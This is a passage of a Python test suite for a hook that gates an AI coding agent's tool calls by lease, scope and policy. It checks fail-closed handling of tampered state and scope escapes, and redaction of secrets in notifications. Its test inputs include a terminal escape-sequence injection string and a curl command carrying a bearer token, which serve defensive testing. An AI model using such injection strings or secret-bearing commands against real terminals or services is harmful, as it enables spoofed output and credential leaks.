            {"tool_name": "Bash", "tool_input": {"command": "cat /tmp/normal.txt"}},
            {"tool_name": "Edit", "tool_input": {"file_path": "/tmp/normal.txt"}},
            {"tool_name": "Write", "tool_input": {"file_path": "/tmp/normal.txt", "content": "x"}},
            {"tool_name": "NotebookEdit", "tool_input": {"notebook_path": "/tmp/normal.ipynb"}},
        ]
        for invocation in cases:
            code, err = hook.evaluate_invocation(invocation, gate=gate, state_dir=td)
            check(f"{invocation['tool_name']} -> exit 2", code == 2, f"got {code}")
            check(
                f"{invocation['tool_name']} reports STATE_STORE_ERROR",
                err is not None and "STATE_STORE_ERROR" in err,
                f"got err={err!r}",
            )


def test_relative_write_path_uses_invocation_cwd_for_lease_scope() -> None:
    print("\n[Write Scope] Relative write target must resolve against invocation cwd")
    with tempfile.TemporaryDirectory() as td:
        worktree = os.path.realpath(os.path.join(td, "worktree"))
        outside = os.path.realpath(os.path.join(td, "outside"))
        os.makedirs(worktree)
        os.makedirs(outside)
        state_file = os.path.join(td, "leases.json")
        store = LeaseStateStore(
            state_path=state_file,
            observer=lambda state: ObservedExecutionState(
                starting_head=state.starting_head,
                status_digest=state.baseline_anchor.status_digest,
                tree_digest=state.baseline_anchor.tree_digest,
            ),
        )
        task = CanonicalTaskReference("edit-task", "1" * 64, frozenset({"edit"}))
        policy = PolicyReference("p1", "2" * 64, frozenset({"edit"}))
        context = RuntimeContext(
            "repo1", worktree, "task/edit", "3" * 40, "4" * 64, "5" * 64
        )
        lease = derive_lease(task, policy, context)
        store.issue(lease)
        store.activate(lease.lease_id)
        domain = leg.ManagedExecutionDomain("repo1", worktree, "lease", "p1", "2" * 64)
        gate = leg.LocalExecutionGate(
            state_store=store,
            domain_resolver=lambda path: domain if leg._is_path_inside(path, worktree) else None,
            policy_evaluator=lambda _p, _path, _a: True,
        )

        previous_cwd = os.getcwd()
        try:
            os.chdir(worktree)
            code, err = hook.evaluate_invocation(
                {
                    "tool_name": "Edit",
                    "tool_input": {"file_path": "outside.py"},
                    "cwd": outside,
                },
                gate=gate,
                state_dir=td,
            )
        finally:
            os.chdir(previous_cwd)

        check("relative target outside active worktree -> exit 2", code == 2, f"got {code}")
        check("relative target reports SCOPE_ESCAPE", err is not None and "SCOPE_ESCAPE" in err)


def test_valid_shaped_capability_tampering_fails_closed_through_runner() -> None:
    print("\n[Lease Identity] Persisted capability tampering must fail closed through the runner")
    with tempfile.TemporaryDirectory() as td:
        worktree = os.path.join(td, "worktree")
        os.makedirs(worktree)
        state_file = os.path.join(td, "leases.json")
        store = LeaseStateStore(
            state_path=state_file,
            observer=lambda state: ObservedExecutionState(
                starting_head=state.starting_head,
                status_digest=state.baseline_anchor.status_digest,
                tree_digest=state.baseline_anchor.tree_digest,
            ),
        )
        task = CanonicalTaskReference(
            "test-only",
            "1" * 64,
            frozenset({"test"}),
            test_profile="python-tests-v1",
        )
        policy = PolicyReference(
            "p1",
            "2" * 64,
            frozenset({"edit", "test"}),
            approved_test_profiles=frozenset({"python-tests-v1"}),
        )
        context = RuntimeContext(
            "repo1",
            os.path.realpath(worktree),
            "task/test-only",
            "3" * 40,
            "4" * 64,
            "5" * 64,
        )
        lease = derive_lease(task, policy, context)
        store.issue(lease)
        store.activate(lease.lease_id)
        with open(state_file, "r", encoding="utf-8") as state_in:
            state_doc = json.load(state_in)
        state_doc["leases"][0]["capabilities"] = ["edit"]
        state_doc["leases"][0]["test_profile"] = None
        with open(state_file, "w", encoding="utf-8") as state_out:
            json.dump(state_doc, state_out)

        domain = leg.ManagedExecutionDomain(
            "repo1", os.path.realpath(worktree), "lease", "p1", "2" * 64
        )
        gate = leg.LocalExecutionGate(
            state_store=store,
            domain_resolver=lambda _: domain,
            policy_evaluator=lambda _p, _path, _a: True,
        )
        code, err = hook.evaluate_invocation(
            {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(worktree, "file.txt")}},
            gate=gate,
            state_dir=td,
        )

        check("tampered capability -> exit 2", code == 2, f"got {code}")
        check("tampered capability reports STATE_STORE_ERROR", err is not None and "STATE_STORE_ERROR" in err)


def test_legacy_and_missing_capability_state_fail_closed_through_runner() -> None:
    print("\n[Lease Schema] Legacy or incomplete capability state must fail closed through the runner")
    for label in ("legacy-v3", "missing-capabilities"):
        with tempfile.TemporaryDirectory() as td:
            worktree = os.path.join(td, "worktree")
            os.makedirs(worktree)
            state_file = os.path.join(td, "leases.json")
            store = LeaseStateStore(state_path=state_file)
            task = CanonicalTaskReference("edit-task", "1" * 64, frozenset({"edit"}))
            policy = PolicyReference("p1", "2" * 64, frozenset({"edit"}))
            context = RuntimeContext(
                "repo1", os.path.realpath(worktree), "task/edit", "3" * 40, "4" * 64, "5" * 64
            )
            lease = derive_lease(task, policy, context)
            store.issue(lease)
            with open(state_file, "r", encoding="utf-8") as state_in:
                state_doc = json.load(state_in)
            if label == "legacy-v3":
                state_doc["version"] = 3
            else:
                state_doc["leases"][0].pop("capabilities")
                state_doc["leases"][0].pop("test_profile")
            with open(state_file, "w", encoding="utf-8") as state_out:
                json.dump(state_doc, state_out)

            gate = leg.create_default_gate(state_path=state_file, domain_resolver=lambda _: None)
            code, err = hook.evaluate_invocation(
                {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(worktree, "file.txt")}},
                gate=gate,
                state_dir=td,
            )
            check(f"{label} -> exit 2", code == 2, f"got {code}")
            check(f"{label} reports STATE_STORE_ERROR", err is not None and "STATE_STORE_ERROR" in err)


def test_translation_failure_does_not_skip_gate() -> None:
    print("\n[Presentation Boundary] Konjac failure does not skip canonical gate")
    original_translate = hook.konjac.translate_tool_event
    original_evaluate = hook.runner.evaluate_invocation
    original_stdin = sys.stdin
    original_stdout = sys.stdout
    original_stderr = sys.stderr
    calls = []
    stdout = io.StringIO()
    stderr = io.StringIO()

    def fail_translation(*_args, **_kwargs):
        raise RuntimeError("synthetic presentation failure")

    def fake_evaluate(data):
        calls.append(data)
        return 0, None

    try:
        hook.konjac.translate_tool_event = fail_translation
        hook.runner.evaluate_invocation = fake_evaluate
        sys.stdin = io.StringIO(json.dumps({"tool_name": "Read", "tool_input": {}}))
        sys.stdout = stdout
        sys.stderr = stderr
        result = hook.main()
    finally:
        hook.konjac.translate_tool_event = original_translate
        hook.runner.evaluate_invocation = original_evaluate
        sys.stdin = original_stdin
        sys.stdout = original_stdout
        sys.stderr = original_stderr

    check("Konjac failure keeps hook result", result == 0, f"got {result}")
    check("canonical gate still evaluated", len(calls) == 1, f"calls={len(calls)}")
    check("Konjac fallback stdout is JSON", stdout.getvalue().lstrip().startswith("{"))
    output = json.loads(stdout.getvalue())
    check("Konjac fallback is user-visible", "systemMessage" in output)
    check("Konjac failure does not emit success stderr", stderr.getvalue() == "")


def test_permission_request_hook() -> None:
    print("\n[Permission Request Hook] PermissionRequest で日本語バナーが出力される")
    hook_path = os.path.join(_ADAPTER_DIR, "permission_request_hook.py")
    payload = {
        "hook_event_name": "PermissionRequest",
        "tool_name": "Bash",
        "tool_input": {"command": "git push origin feature-x"},
    }
    proc = subprocess.run([sys.executable, hook_path], input=json.dumps(payload), capture_output=True, text=True)
    check("PermissionRequest hook -> exit 0", proc.returncode == 0)
    check("PermissionRequest stdout is JSON", proc.stdout.lstrip().startswith("{"), f"stdout={proc.stdout!r}")
    output = json.loads(proc.stdout)
    check("PermissionRequest outputs structured card", "ここからPCの外へ出ます" in output["systemMessage"] and "外部送信" in output["systemMessage"])
    notification = output.get("terminalSequence", "")
    notification_prefix = "\x1b]777;notify;ume-harness;"
    check("PermissionRequest emits an official terminal notification", notification.startswith(notification_prefix) and notification.endswith("\x07"))
    check("PermissionRequest terminal notification is Japanese", "🇯🇵" in notification and "外部送信" in notification)
    notification_body = notification[len(notification_prefix):-1]
    check("PermissionRequest notification contains no injected control bytes", all(ord(char) >= 32 and not 127 <= ord(char) <= 159 for char in notification_body))
    hostile_notification = permission_hook._terminal_notification("🇯🇵 危険;\x1b]777;notify;attacker;injected\x07\x9b")
    hostile_body = hostile_notification[len(notification_prefix):-1]
    check("PermissionRequest notification strips hostile controls", all(ord(char) >= 32 and not 127 <= ord(char) <= 159 for char in hostile_body))
    check("PermissionRequest notification neutralizes field separators", ";" not in hostile_body)
    secret_proc = subprocess.run(
        [sys.executable, hook_path],
        input=json.dumps({
            "hook_event_name": "PermissionRequest",
            "tool_name": "Bash",
            "tool_input": {"command": "curl -H 'Authorization: Bearer super-secret' https://example.com"},
        }),
        capture_output=True,
        text=True,
    )
    secret_output = json.loads(secret_proc.stdout)
    check("PermissionRequest notification never includes raw secret-bearing input", "super-secret" not in secret_output["terminalSequence"])
    check("PermissionRequest presentation does not decide authority", "hookSpecificOutput" not in output)
    check("PermissionRequest success stderr is empty", proc.stderr == "", f"stderr={proc.stderr!r}")


def test_posttooluse_failure_hook() -> None:
    print("\n[PostToolUse Failure Hook] ツール実行失敗時に事実ベースの日本語解説が出力される（ネイティブCC形式）")
    hook_path = os.path.join(_ADAPTER_DIR, "posttooluse_failure_hook.py")
    payload = {
        "hook_event_name": "PostToolUseFailure",
        "error": "Exit code 127\n/bin/sh: command not found: unknown_bin",
        "is_interrupt": False,
        "duration_ms": 50,
    }
    proc = subprocess.run([sys.executable, hook_path], input=json.dumps(payload), capture_output=True, text=True)
    check("PostToolUseFailure hook -> exit 0", proc.returncode == 0)
    check("PostToolUseFailure stdout is JSON", proc.stdout.lstrip().startswith("{"), f"stdout={proc.stdout!r}")
    output = json.loads(proc.stdout)
    check("PostToolUseFailure parses native exit code", "終了コード: 127" in output["systemMessage"])
    check("PostToolUseFailure outputs truthful status", "途中で失敗しました" in output["systemMessage"] and "変更状態を確認" in output["systemMessage"])
    hook_output = output.get("hookSpecificOutput", {})
    check("PostToolUseFailure event name is canonical", hook_output.get("hookEventName") == "PostToolUseFailure")
    check("PostToolUseFailure adds Claude context", hook_output.get("additionalContext") == output["systemMessage"])
    check("PostToolUseFailure success stderr is empty", proc.stderr == "", f"stderr={proc.stderr!r}")


def main() -> None:
    test_read_tool_allowed()
    test_pretooluse_allow_emits_structured_system_message()
    test_pretooluse_write_uses_visible_detailed_banner()
    test_edit_tool_allowed_tier_normal_unmanaged()
    test_unmanaged_protected_paths_use_canonical_tier()
    test_compound_secret_directories_use_secret_tier()
    test_destructive_bash_blocked()
    test_git_push_blocked()
    test_safe_readonly_bash_allowed()
    test_path_free_readonly_git_commands_remain_allowed()
    test_bash_read_operands_are_resolved_or_fail_closed()
    test_ls_recursive_or_dereference_options_fail_closed()
    test_cwd_sensitive_and_git_reads_fail_closed_for_protected_paths()
    test_restrictive_grep_glob_caps_matching_paths_not_unrelated_tree()
    test_grep_glob_character_class_mismatch_fails_closed()
    test_recursive_policy_expansion_caps_visited_entries()
    test_grep_globs_never_under_approximate_secret_matches()
    test_glob_brace_expansion_never_under_approximates_secret_matches()
    test_glob_extglob_and_negation_never_under_approximate_secret_matches()
    test_globstar_matching_is_memoized()
    test_absolute_glob_inside_worktree_is_provable()
    test_glob_directory_symlink_traversal_fails_closed()
    test_unrecognized_bash_fails_closed()
    test_unrecognized_tool_fails_closed()
    test_webfetch_blocked_as_external_mutation()
    test_websearch_requires_approval_as_external_mutation()
    test_malformed_json_input_fails_closed()
    test_missing_tool_name_fails_closed_as_invalid_hook_input()
    test_malformed_tool_paths_fail_closed_without_traceback()
    test_empty_stdin_denied_fail_closed()
    test_activation_state_without_runtime_digest_fails_closed()
    test_lease_gate_managed_domain_with_active_lease_allowed()
    test_test_only_lease_does_not_invent_host_command_authority()
    test_active_lease_cannot_override_constitution_or_execution_gate_tiers()
    test_multiple_active_leases_select_invocation_worktree()
    test_notebook_edit_rejects_conflicting_target_aliases()
    test_read_rejects_conflicting_target_aliases()
    test_lease_gate_managed_domain_without_lease_fails_closed()
    test_lease_gate_active_lease_scope_escape_denied()
    test_bash_shell_chaining_and_redirection_blocked()
    test_control_plane_modification_denied()
    test_active_lease_read_scope_escape_denied()
    test_active_lease_missing_cwd_uses_process_cwd_for_relative_reads()
    test_unmanaged_read_scope_allowed()
    test_corrupt_lease_state_denies_scope_sensitive_reads()
    test_valid_shaped_capability_tampering_fails_closed_through_runner()
    test_legacy_and_missing_capability_state_fail_closed_through_runner()
    test_translation_failure_does_not_skip_gate()
    test_permission_request_hook()
    test_posttooluse_failure_hook()

    print(f"\n=== {PASS} passed, {FAIL} failed ===")
    sys.exit(1 if FAIL else 0)


if __name__ == "__main__":
    main()
